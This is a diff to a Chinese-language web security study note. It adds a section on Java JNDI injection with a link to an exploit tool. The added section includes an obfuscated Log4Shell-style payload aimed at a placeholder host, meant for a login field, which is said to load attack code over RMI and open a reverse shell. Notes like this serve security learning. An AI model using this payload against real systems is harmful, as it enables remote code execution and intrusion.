@@ -30,8 +30,9 @@ categories:
     - 3.4. [CSRF](#csrf)
         - 3.4.1. [解决方案](#解决方案)
     - 3.5. [XSS](#xss)
+    - 3.6. [Java JNDI注入攻击](#java-jndi注入攻击)
 
-💠 2025-02-06 17:03:57
+💠 2025-02-11 11:26:37
 ****************************************
 
 # Web应用网络安全
@@ -224,3 +225,9 @@ CC攻击是攻击者借助代理服务器生成指向受害主机的合法请求
 > [xss攻击入门](http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html)
 > [ XSS攻击及防御 ](https://blog.csdn.net/ghsau/article/details/17027893)
 > [最新的黑客技术：详解XSS跨站脚本攻击 ](http://soft.yesky.com/security/hkjj/136/2233136.shtml)
+
+## Java JNDI注入攻击
+> [welk1n/JNDI-Injection-Exploit: JNDI注入测试工具](https://github.com/welk1n/JNDI-Injection-Exploit)  
+
+例如登录接口 用户名输入 `${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://x.x.x.x:xx/xxx}` 触发JNDI注入，RMI方式加载攻击代码，得到反弹shell
+
